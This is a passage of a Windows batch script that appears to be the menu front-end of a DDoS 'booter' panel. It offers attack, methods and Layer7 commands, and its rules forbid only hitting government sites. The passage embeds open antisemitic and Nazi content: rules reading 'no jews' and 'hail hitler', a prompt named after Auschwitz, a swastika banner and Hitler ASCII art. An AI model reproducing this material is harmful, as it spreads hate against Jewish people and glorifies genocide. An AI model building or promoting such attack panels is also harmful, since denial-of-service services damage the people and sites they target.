if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:tos
cls
echo ╔╦╗╔═╗╔═╗
echo  ║ ║ ║╚═╗
echo  ╩ ╚═╝╚═╝
echo 1. no hitting fbi/gov sites
echo 2. no sharing ip and port
echo 3. no sharing login info
echo 4. if you break a rule and get banned dont say anyone scammed you for your actions
echo 5. no jews
echo 6. hail hitler

set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong

:banners
cls
echo                              ╔╗ ╔═╗╔╗╔╔╗╔╔═╗╦═╗╔═╗
echo                              ╠╩╗╠═╣║║║║║║║╣ ╠╦╝╚═╗
echo                              ╚═╝╩ ╩╝╚╝╝╚╝╚═╝╩╚═╚═╝
echo                            ╔═══════════════════════╗
echo                            ║1. superior            ║
echo                            ║2. auschwitz           ║
echo                            ║3. hitler              ║
echo                            ║4. putin               ║
echo                            ╚═══════════════════════╝

set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:superior
cls
echo                         [36m ╔═╗ ╦ ╦ ╔═╗ ╔═╗[40;37m ╦═╗ ╦ ╔═╗ ╦═╗
echo                         [36m ╚═╗ ║ ║ ╠═╝ ║╣ [40;37m ╠╦╝ ║ ║ ║ ╠╦╝
echo                         [36m ╚═╝ ╚═╝ ╩   ╚═╝[40;37m ╩╚═ ╩ ╚═╝ ╩╚═
echo                               [36m♕  We Are S[40;37muperior ♕
echo                 [36m╔════════════════════════[40;37m═════════════════════╗
echo                 [36m║ Welcome to superior pow[40;37mered by superiorAPI  ║
echo                 [36m║      Type "HELP" For A [40;37mList Of Commands     ║
echo                 [36m╚════════════════════════[40;37m═════════════════════╝
echo                    [36m ╔════════════════════[40;37m═══════════════╗
echo                     [36m║         Join dsc.gg[40;37m/superior      ║
echo                     [36m╚════════════════════[40;37m═══════════════╝
echo              [36m    ╔═══════════════════════[40;37m═══════════════════╗
echo            [36m      ║  - - Connection Has Be[40;37men [38;2;0;255;152mEstablished [40;37m - -║
echo              [36m    ╚═══════════════════════[40;37m═══════════════════╝
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:nazi
cls
echo                             [38;2;255;0;0m████[40;37m╗   [38;2;255;0;0m████████████[40;37m╗
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████████████[40;37m║
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m╔═══════╝
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████████████[40;37m╗  
echo                             [38;2;255;0;0m████████████████████[40;37m║ 
echo                             ╚═══════[38;2;255;0;0m████[40;37m╔═══[38;2;255;0;0m████[40;37m║
echo                                     [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [40;37m╚═══════════╝   ╚═══╝
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:hitler
cls
echo ░░░░░░░░░░░▄▄▄▄▄
echo ░░░░░░░▄▄█████████▄▄
echo ░░░░▄▀▀▀▀█▀▀▀▀▀▀█████▄
echo ░░▄██████░░░░░░░░░░░▀██
echo ░▐██████▌░░░░░░░░░░░░░▐▌
echo ░███████▌░░░░░░░░░░░░░░█
echo ▐████████░░░░░░░░░░░░░░░█
echo ▐██████▌░░░░░▄▀▀▀▀▀▄░▀░▄▄▌
echo ░█▀▀███▀░░░░░░▄▀█▀░░░▐▄▄▄▌
echo ▐░▌▀▄░░░░░░░░░░▄▄▄▀░░░▌▀░▌
echo ░▌▐░░▌░░░░░░░░░░░▀░░░░▐░▐
echo ░▐░▀▄▐░░░░░░░░░░░▌▌░▄▄░▐░▌
echo ░░▀█░▄▀░░░░░░░░░▐░▐▄▄▄▄▀▐
echo ░░░▌▀░▐░░░░░░░░▄▀░░▀▀▀▀░▌
echo ░░░▐░░░░░░░░░▌░░░▄▀▀▀▀▄▐
echo ░░░▌░░░░░░░░░▐░░░░░▄▄░░▌
echo ░░█▀▄░░░▐░▐░░░░░░░░░░░█
echo ░█░█░▀▀▄░▌░█░░░▀▀▄▄▄▄▀
echo █░░░▀▄░░▀▀▄▄█░░░░░▄▀
echo ░░░░░░▀▄░░░░▀▀▄▄▄▀▐
echo █░░░░░░░▀▄░░░░░▐░▌▐
echo ░█░░░░░░░░▀▄░░░▌░▐▌▐
echo ░░█░░░░░░░░░█░▐░▄▄▌░█▀▄
echo ░░░█░░░░░░░░░█▌▐░▄▐░░▀▄▀▀▄▄
echo ░░░░█░░░░░░░░░▀▄░░▐░░░▀▄░░░▀▀▄▄
echo ░░░░░▀▄░▄▀█░░░░░█░░▌░░░░▀▄░░░░░█
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:putin
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;202;48;5;180m▒[38;5;202;48;5;216m░[38;5;166;48;5;173m▒[38;5;166;48;5;180m░[38;5;202;48;5;180m▒[38;5;166;48;5;216m░[38;5;166;48;5;216m░[38;5;166;48;5;179m▒[38;5;202;48;5;180m░[38;5;173;48;5;173m▒[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;166;48;5;131m▓[38;5;166;48;5;131m▒[38;5;166;48;5;95m▒[38;5;202;48;5;131m▒[38;5;166;48;5;173m▒[38;5;202;48;5;173m▒[38;5;202;48;5;180m▒[38;5;202;48;5;216m░[38;5;202;48;5;216m░[38;5;202;48;5;216m [38;5;202;48;5;216m░[38;5;166;48;5;216m [38;5;166;48;5;216m [38;5;208;48;5;222m [38;5;166;48;5;216m [38;5;166;48;5;180m░[38;5;166;48;5;173m▒[38;5;180;48;5;137m▒[38;5;202;48;5;131m▒[38;5;208;48;5;94m▒[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;209;48;5;95m▓[38;5;202;48;5;52m░[38;5;202;48;5;58m▒[38;5;173;48;5;95m▒[38;5;166;48;5;94m▒[38;5;202;48;5;173m▒[38;5;166;48;5;173m▒[38;5;166;48;5;216m░[38;5;202;48;5;216m░[38;5;166;48;5;216m [38;5;130;48;5;222m [38;5;222;48;5;223m [38;5;214;48;5;223m [38;5;178;48;5;230m [38;5;94;48;5;229m [38;5;221;48;5;229m [38;5;172;48;5;223m [38;5;220;48;5;230m [38;5;172;48;5;223m [38;5;166;48;5;216m [38;5;202;48;5;216m░[38;5;202;48;5;173m░[38;5;173;48;5;131m▒[38;5;173;48;5;131m▒[38;5;209;48;5;95m▒[38;5;166;48;5;58m▒[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;204;48;5;236m▒[38;5;173;48;5;237m▒[38;5;173;48;5;52m░[38;5;209;48;5;95m▒[38;5;173;48;5;95m▒[38;5;202;48;5;131m▒[38;5;202;48;5;216m [38;5;214;48;5;223m [38;5;178;48;5;229m [38;5;230;48;5;230m [38;5;178;48;5;229m [38;5;222;48;5;223m [38;5;136;48;5;229m [38;5;172;48;5;223m [38;5;220;48;5;229m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;94;48;5;229m [38;5;172;48;5;223m [38;5;130;48;5;222m [38;5;130;48;5;223m [38;5;94;48;5;223m [38;5;172;48;5;223m [38;5;166;48;5;223m [38;5;202;48;5;216m [38;5;173;48;5;215m░[38;5;202;48;5;173m▒[38;5;202;48;5;131m▒[38;5;166;48;5;131m▒[38;5;209;48;5;94m▒[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;209;48;5;238m▒[38;5;209;48;5;236m▒[38;5;166;48;5;174m▒[38;5;166;48;5;180m▒[38;5;166;48;5;222m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;229;48;5;229m [38;5;220;48;5;229m [38;5;230;48;5;230m [38;5;136;48;5;229m [38;5;94;48;5;223m [38;5;214;48;5;223m [38;5;221;48;5;229m [38;5;220;48;5;229m [38;5;220;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;220;48;5;229m [38;5;214;48;5;230m [38;5;223;48;5;223m [38;5;202;48;5;173m▒[38;5;202;48;5;137m▒[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;209;48;5;236m▒[38;5;173;48;5;138m▓[38;5;209;48;5;181m▓[38;5;202;48;5;224m [38;5;172;48;5;223m [38;5;229;48;5;229m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;231m [38;5;230;48;5;231m [38;5;230;48;5;231m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;136;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;223;48;5;222m [38;5;209;48;5;138m▒[38;5;173;48;5;95m▒[38;5;173;48;5;95m▒[38;5;173;48;5;95m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;95;48;5;138m▓[38;5;209;48;5;95m▓[38;5;173;48;5;180m▓[38;5;173;48;5;180m▒[38;5;172;48;5;224m [38;5;221;48;5;229m [38;5;136;48;5;229m [38;5;220;48;5;230m [38;5;221;48;5;229m [38;5;221;48;5;229m [38;5;136;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;231m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;220;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;220;48;5;230m [38;5;220;48;5;230m [38;5;94;48;5;223m [38;5;172;48;5;223m [38;5;202;48;5;137m▒[38;5;209;48;5;174m▒[38;5;202;48;5;52m [38;5;202;48;5;235m░[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;209;48;5;137m▓[38;5;202;48;5;224m▒[38;5;167;48;5;224m░[38;5;202;48;5;223m [38;5;130;48;5;222m [38;5;214;48;5;223m [38;5;172;48;5;222m [38;5;214;48;5;223m [38;5;178;48;5;230m [38;5;130;48;5;223m [38;5;222;48;5;223m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;230;48;5;230m [38;5;221;48;5;229m [38;5;221;48;5;229m [38;5;172;48;5;223m [38;5;172;48;5;222m [38;5;222;48;5;223m [38;5;172;48;5;222m [38;5;130;48;5;223m [38;5;202;48;5;216m░[38;5;173;48;5;137m▒[38;5;173;48;5;95m▒[38;5;52;48;5;233m [38;5;202;48;5;237m▒[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓
echo [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;138;48;5;137m▓[38;5;202;48;5;138m▓[38;5;202;48;5;224m [38;5;173;48;5;217m░[38;5;230;48;5;230m [38;5;130;48;5;222m [38;5;130;48;5;222m [38;5;172;48;5;222m [38;5;214;48;5;223m [38;5;172;48;5;223m [38;5;130;48;5;222m [38;5;172;48;5;223m [38;5;172;48;5;222m [38;5;172;48;5;223m [38;5;222;48;5;223m [38;5;136;48;5;229m [38;5;178;48;5;230m [38;5;172;48;5;224m [38;5;222;48;5;223m [38;5;222;48;5;223m [38;5;172;48;5;223m [38;5;221;48;5;230m [38;5;220;48;5;230m [38;5;230;48;5;230m 